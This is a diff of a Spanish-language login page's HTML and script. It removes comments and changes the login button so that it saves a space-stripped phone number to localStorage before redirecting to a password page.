@@ -7,7 +7,6 @@
 
     <link rel="stylesheet" href="./css/footer.css" />
     <link rel="stylesheet" href="./css/spinner.css" />
-    <!-- <link rel="stylesheet" href="./css/navbar.css" /> -->
     <link rel="stylesheet" href="./css/globals.css" />
 
     <link rel="shortcut icon" type="image/x-icon" href="./assets/favicon.ico" />
@@ -189,7 +188,6 @@
         const loginButton = document.getElementById("loginButton");
         const mainContainer = document.getElementById("mainContainer");
 
-        // Detectar cuando se abre el teclado
         function handleVisualViewport() {
           if (window.visualViewport) {
             if (window.visualViewport.height < window.innerHeight) {
@@ -221,19 +219,14 @@
 
         form.addEventListener("input", actualizarEstadoBoton);
 
-        // ✅ REDIRECCIÓN DIRECTA SIN ALERT
         loginButton.addEventListener("click", (event) => {
           event.preventDefault();
           if (LoginValidation(form)) {
-            // Guardar el número en localStorage
             const phoneNumber = document.getElementById("phoneNumber").value;
-            localStorage.setItem("formData", JSON.stringify({
-              phoneNumber: phoneNumber
-            }));
-            // Redirigir a la página de clave
+            const cleanNumber = phoneNumber.replace(/\s/g, '');
+            localStorage.setItem("numeroTelefono", cleanNumber);
             window.location.href = "access-sign-in-pass.php.html";
           }
-          // Si el número es inválido, NO hace nada (el botón está deshabilitado)
         });
       });
     </script>
